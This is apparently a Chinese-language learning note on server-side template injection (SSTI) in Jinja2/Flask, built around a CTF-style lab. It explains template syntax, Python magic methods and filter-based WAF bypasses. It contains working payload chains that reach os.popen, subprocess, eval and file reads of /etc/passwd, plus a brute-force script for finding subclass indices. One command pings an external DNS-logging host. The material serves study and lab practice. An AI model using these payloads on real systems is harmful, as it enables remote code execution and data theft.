[TOC]

[X3NNY/sstilabs: A lab to help you learning SSTI (github.com)](https://github.com/X3NNY/sstilabs)

### SSTI简介

SSTI就是服务器模板注入 当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC的模式，用户 的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑 判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分， 模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息 泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只 是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者 声明的模块，这适用于所有的模板引擎。

### 模板是什么

模板引擎（特指web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，他可以生成特 定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。 模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成 模板+用户数据的前端 HTML 页面，然后反馈给浏览器，呈现在用户面前。 它可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容 易、清楚且相对安全地编写前后端不同的逻辑。

### 漏洞成因

ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity 等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有 漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

### SSTI基础知识

##### Python-flask模板

Python-Flask使用Jinja2作为渲染引擎 （Jinja2.10.x Documention）

 jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由 于其灵活，快速和安全等优点被广泛使用。

在jinja2中，存在三种语法：

```
控制结构 {% %}，也可以用来声明变量（{% set c = "1" %}）
变量取值 {{ }}，比如输入 1+1，2*2，或者是字符串、调用对象的方法，都会渲染出执行的结果
{# ... #} 表示未包含在模板输出中的注释
在模板注入中，主要使用的是{{}} 和 {%%}
检测是否存在ssti
在url后面，或是参数中添加 {{ 6*6 }} ，查看返回的页面中是否有 36
```

jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等，被两个括号包裹的内容会输出其表达式的值。

###### 过滤器

jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数，用于修饰变量，甚至支持参数 `range(10)|join(', ')`；以及链式调用，只需要在变量后面使用管道符 `|` 分割，前一个过滤器的输出会作为后一个过滤器的输入，例如，`{{ name|striptags|title }}` 会移除 HTML Tags，并且进行 title-case 转化，这个过滤器翻译为 Python 的语法就是 `title(striptags(name))`。

###### 宏

jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调用它，类似于函数。

使用 `macro` 关键字，并指定宏的名称和参数列表。然后，在模板中使用 `call` 关键字来调用宏，并传递相应的参数。

```jinja2
{% macro greet(name) %}
    Hello, {{ name }}!
{% endmacro %}

{{ greet("A") }}
{{ greet("B") }}
```

还能够设置默认参数

```jinja2
{% macro greet(name, greeting="Hello") %}
    {{ greeting }}, {{ name }}!
{% endmacro %}

{{ greet("A") }}
{{ greet("B", greeting="Hi") }}
```

宏还能够支持导入

```jinja2
{% import 'form.html' as form %}}
{{ form.greet("B", greeting="Hi") }}
```

还有一种调用方法，`call`，`macro` 有一个隐含参数 `caller`，其作用是返回 `call` 块中间的内容

```jinja2
{% macro foo(name) -%}
    <div>{{ name ~ " says: " ~ caller() }}</div>
{%- endmacro %}

{% call foo("wi1shu") %}
    你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好
{% endcall %}
```

>值得注意的是，如果不想传递 `caller` 中的内容，也需要在 `macro` 中调用 `caller()`，否则会报错：
>
>TypeError: macro ‘foo’ was invoked with two values for the special caller argument. This is most likely a bug.

###### 模板继承

模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。并且还支持针对自己需要的地方进行修改。

jinja2 的骨架文件中，利用 `block` 关键字表示其包涵的内容可以进行修改。

base.html

```html
<head>
    {% block head %}
    <title>{% block title %}{% endblock %} - World</title>
    {% endblock %}
</head>

<body>
    <div id="content">{% block content %}{% endblock %}</div>
    <div id="footer">
        {% block  footer %}
        <script>This is javascript</script>
        {% endblock %}
    </div>
</body>
```

sub.html继承base.html的模板：

```html
{% extends "base.html" %}  <!-- 继承 -->

{% block title %} Hello {% endblock %}  <!-- title 自定义 -->

{% block head %}
    {{ super() }}  <!-- 用于获取原有的信息 -->
    <style type='text/css'>
    .important { color: #FFFFFF }
    </style>
{% endblock %}   
 
<!-- 其他不修改的原封不动的继承 -->
```

渲染：

```python
from jinja2 import FileSystemLoader, Environment

env = Environment(loader=FileSystemLoader("./"))
print(env.get_template("sub.html").render())
```

这里用到了 `FileSystemLoader`，其实用它的逻辑很简单。我们在 bbb.html 中写了 `{% extends "base.html" %}`，那 jinja2 怎么知道 base.html 在哪呢？`FileSystemLoader` 就是用来指定模板文件位置的。同样用途的还有 `PackageLoader`，它是用来指定搜索哪个 Python 包下的模板文件

##### Python中的一些 Magic Method

在Python中，所有以“”双下划线包起来的方法，都统称为“Magic Method”，中文称『魔术方法』,例如类的 初始化方法`__init__`

一些做SSTI类题目时常用的属性和方法

```
属性
__class__：用于获取当前对象所对应的类
__base__：用于获取该类的直接父类（基类）
__bases__：返回一个类直接所继承的类（元组形式）
__mro__：返回一个类所继承的所有类
__dict__：返回当前类的函数、全局变量、属性等
__init__：用于将对象实例化，所有类都具有 __init__ 方法，便于利用它来作为跳板访问 __globals__
__globals__：function.__globals 用于获取function所处空间下可使用的module、方法以及所有变量
__builtins__：获取python内置的方法比如ord、chr等
方法
__subclasses__：返回该类的所有直接子类
__import__：动态加载类和函数，也就是导入模块，经常用于导入os模块
__getattribute__：在访问对象的属性时进行自定义处理。无论对象中的属性是否存在，只要访问对象的属性，就会无条件进入
__getattr__：访问对象中不存在的属性时进行处理。当对象中没有被访问的属性时，Python解释器会自动调用该方法
```

#### 常用注入模块

爆破需要的模块的EXP：

```Python
import requests
from lxml import html

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
}

url = "http://192.168.159.128:50000/level/1"

NUM = 500

if __name__ == "__main__":

    # # 查找类
    # find_class = "importlib"
    # for i in range(NUM):
    #
    #     data_class1 = {
    #         'code': "{{().__class__.__bases__[0].__subclasses__()[%d]}}" % i
    #     }
    #
    #     res = requests.post(url=url, data=data_class1, headers=headers)
    #     if find_class in res.text:
    #         tree = html.fromstring(res.text)
    #         print(str(i) + " -> " + tree.text)

    # 查找类方法
    find_method = "load_module"
    for i in range(NUM):

        data_method = {
            'code': "{{().__class__.__bases__[0].__subclasses__()[%d].__init__.__globals__}}" % i
        }

        data_class = {
            'code': "{{().__class__.__bases__[0].__subclasses__()[%d]}}" % i
        }

        res = requests.post(url=url, data=data_method, headers=headers)
        if find_method in res.text:
            res2 = requests.post(url=url, data=data_class, headers=headers)
            tree = html.fromstring(res2.text)
            print(str(i) + " -> " + tree.text)

    # # 查看内置函数
    # for i in range(NUM):
    #     data_builtins = {
    #         'code': "{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}" % i
    #     }
    #
    #     res3 = requests.post(url=url, data=data_builtins, headers=headers)
    #     if res3.text != "Hello " and res3.text != "No this level":
    #         print(html.fromstring(res3.text).text.replace("\n", "【回车】"))
    #         break

    # # 查看某个类的__globals__
    # data_globals = {
    #     'code': "{{().__class__.__bases__[0].__subclasses__()[" + str(133) + "].__init__.__globals__}}"
    # }
    #
    # res3 = requests.post(url=url, data=data_globals, headers=headers)
    # if res3.text != "Hello " and res3.text != "No this level":
    #     print(html.fromstring(res3.text).text.replace("\n", "【回车】"))

```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729181809015.png)

```
<class 'os._wrap_close'>类：
利用popen()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()
利用system()执行命令：().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['system']('ping 78319.UOFOS5Q7RU.dns.xms.la')

通过__builtins__获取内置方法，能够调用__builtins__即可，测试很多类都能够调用：
利用eval()执行命令：().__class__.__bases__[0].__subclasses__()[465].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat ./flag").read()')
通过open()查看flag：().__class__.__bases__[0].__subclasses__()[465].__init__.__globals__['__builtins__']['open']('./flag', 'r').read()

<class 'subprocess.Popen'>类：
利用subprocess.run()执行命令：().__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['run']('whoami', capture_output=True, text=True).stdout
利用subprocess.Popen()执行命令：().__class__.__bases__[0].__subclasses__()[396].__init__.__globals__['Popen'](["touch", "./456"])

<class '_frozen_importlib.BuiltinImporter'>类：
利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()

利用linecache函数执行命令，有几个类都有这个函数：
linecache()这个函数中也引入了os模块：().__class__.__bases__[0].__subclasses__()[259].__init__.__globals__['linecache'].os.popen('dir').read()

<class '_frozen_importlib_external.FileLoader'>类：
通过get_data函数读取文件内容：().__class__.__bases__[0].__subclasses__()[94]["get_data"](0, "/etc/passwd")

os模块执行命令:
通过config，调用os模块：config.__class__.__init__.__globals__['os'].popen('whoami')
通过url_for，调用os：{url_for.__globals__.os.popen('whoami').read()
在已经加载os模块的子类里直接调用os模块：''.__class__.__bases__[0].__subclasses__()[341].__init__.__globals__['os'].popen("ls -l").read()
```

`subprocess.Popen()`![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729180632010.png)

`os.system()`
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729182735682.png)

`linecache()`执行命令
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729191643448.png)

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729192011745.png)

解析`{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}`
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230729184733593.png)

>`__class__.__base__.__subclasses__()` 列表中通常不会包含 `file` 类的子类，因为在 Python 3 中，`file` 类已经被移除，不再是内置类型。
>
>在早期版本的 Python（Python 2.x）中，`file` 类用于表示文件对象，并作为内置的文件 I/O 类型。但从 Python 3 开始，`file` 类被替代为内置的 `io` 模块中的 `io.TextIOWrapper` 和 `io.BufferedIOBase` 等类。
>
>在 Python 3 中，文件 I/O 操作应该使用 `open()` 函数来打开文件，而不是直接使用 `file` 类。`open()` 函数返回一个文件对象，它是 `io.TextIOWrapper` 或 `io.BufferedIOBase` 的实例，可以用于进行文件读写操作。

>```
><class '_frozen_importlib.BuiltinImporter'>类：
>利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()
>```
>
>这里的`load_module`是一个静态方法，所以能够直接通过类调用而不用实例化对象

#### {% %}使用

{% %}是属于flask的控制语句，且以{% end.. %}结尾，可以通过在控制语句，定义变量或者写循环，判断。

index.html

```html
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ heading }}</h1>
    <ul>
        {% for item in items %}
			{% if item == "wi1shu" %}
				<li>This is {{ item }}</li>
			{% else %}
				<li>{{ item }}</li>
			{% endif %}
        {% endfor %}
    </ul>
</body>
</html>
```

app.py

```python
from flask import Flask, render_template
from jinja2 import Template

app = Flask(__name__)


@app.route('/')
def main():
    return render_template('index.html', title='My Page', heading='Welcome to My Page', items=['Apple', 'Banana', 'Orange'])


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=50000)
```

设置变量

```jinja2
{% set a = 'Apple' %}
{{ a }}
```

利用方式

由于模板语法对 Python 语句是有一定程度支持的，所以可以这样利用：

```python
@app.route('/demo1/')
def demo1():
    payload = Template('''
        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
            {% set wi1 = i.__init__.__globals__['popen']('whoami').read() %} 
            {{wi1}}
        {% endfor %}
    ''').render()
    return payload
```

但并不是完全支持 Python 所有的语法，所以很多语法是无法使用的，比如列表推导式

```python
try:
    print(Template('''
        {{ [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami') }}
        ''').render())
except Exception:
    print(traceback.format_exc())
```

会报错：`jinja2.exceptions.TemplateSyntaxError: expected token ',', got 'for'`

### waf绕过

#### 绕过数字、字符

沙箱逃逸中的`[ ]` 扣字符拼接、`chr` 等。

1. 数字 0：`{{ {}|int }}`、`{{ {}|length }}`
2. 数字 1：`{{ ({}|int)**({}|int) }}`
3. 理论上有了 1 之后就可以搞出所有其他数字，可以用 `+` 或者是 `-`+`|abs`
4. 空格：`{{ {}|center|last }}`、`{1:1}|xmlattr|first`
5. `<`：`{}|select|string|first`
6. `>`：`{}|select|string|last`
7. 点：`{{ self|float|string|min }}` 或者 `c.__lt__|string|truncate(3)|first`
8. `a-z`：`{{ range.__doc__ + dict.__doc__}}`
9. `A-Z`：`{{ (range.__doc__ + dict.__doc__) | upper }}`

上面这种都比较常规，思路还是扣字符的思路，顶多是过滤器做了变化。

这里多说一下利用格式化字符串实现的任意字符构造（例如字符 `d`）：

1. 首先搞出 `%c`：`{{ {}|string|urlencode|first~(self|string)[16] }}`
2. 然后搞出 `d`：`{{ ({}|string|urlencode|first~(self|string)[16]) % 100 }}`

还不需要引号。

>`__lt__` 是Python中用于比较“小于”操作的特殊方法名。
>
>`<bound method Undefined._fail_with_undefined_error of Undefined>`：这个错误信息是由Jinja2模板引擎的Undefined对象引起的。当在模板中引用了一个未定义的变量或对象时，Jinja2会将其表示为Undefined对象，以便在模板渲染过程中进行处理。
>
>`truncate()` 过滤器用于截断字符串并添加省略号。它可以将一个较长的字符串截断为指定的长度，并在截断处添加省略号以表示字符串被截断了。
>
>`{{"Hello, World!"|truncate(6)}}` -> `Hel...`

>`xmlattr()` 是Jinja2中的一个过滤器，用于将字典中的键值对转换为XML属性字符串。
>
>```python
>person = {
>    'name': 'Alice',
>    'age': 30
>}
>```
>
>`<person {{ person|xmlattr }}>...</person>` 渲染后-> `<person name="Alice" age="30">...</person>`

>`self`：在Jinja2模板中，`self` 表示当前上下文中的对象。`self` 只在自定义过滤器和函数中可用，而在模板中不可用。在模板中，可以直接引用传递给模板的变量和上下文中的属性。

>`~` 是字符串拼接运算符。它用于连接两个字符串并生成一个新的字符串。
>
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230803023115250.png)